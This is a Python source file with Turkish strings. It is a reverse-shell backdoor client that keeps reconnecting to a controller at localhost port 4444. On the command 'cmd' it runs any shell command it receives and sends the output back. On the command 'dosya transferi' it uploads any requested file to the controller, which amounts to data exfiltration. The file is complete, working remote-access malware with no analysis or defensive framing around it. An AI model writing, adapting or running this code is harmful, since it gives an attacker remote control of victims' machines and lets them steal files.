import socket
import os
import subprocess
import time

while True:
    try:

        s = socket.socket()

        host = "localhost"
        port = 4444

        s.connect((host, port))

        while True:

            veri = s.recv(1024).decode("utf-8")

            if veri == "cmd":

                while True:

                    veri = s.recv(1024).decode("utf-8")

                    if veri[:2] == "cd":

                        try:
                            os.chdir(veri[3:])
                            s.send(os.getcwd().encode("utf-8"))

                        except FileNotFoundError:
                            s.send("Dosya Bulunamadı...".encode("utf-8"))
                    
                    elif veri == "quit":
                        break
                    
                    else:

                        if len(veri) > 0:
                            
                            cmd = subprocess.Popen(veri, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                            cikti = cmd.stdout.read() + cmd.stderr.read()
                            cikti_str = str(cikti, encoding="cp857")
                            konum = os.getcwd()

                            s.send(str.encode(cikti_str + "\n" + "Bulunduğunzu Yer: " + konum, encoding="utf-8"))

                        else:

                            s.send(b" ")

            elif veri == "dosya transferi":

                konum = s.recv(1024).decode('utf-8')
                boyut = str(os.path.getsize(konum))
                s.send(boyut.encode('utf-8'))
                s.recv(1024)

                with open(konum, "rb") as dosya:

                    veri = dosya.read(1024)

                    while veri:

                        s.send(veri)

                        veri = dosya.read(1024)

            else:

                s.send(b" ")
    
    except:
        print("Bağlantı Hatası 5 Saniye Sonra Tekrar Denenicek...")
        time.sleep(5)
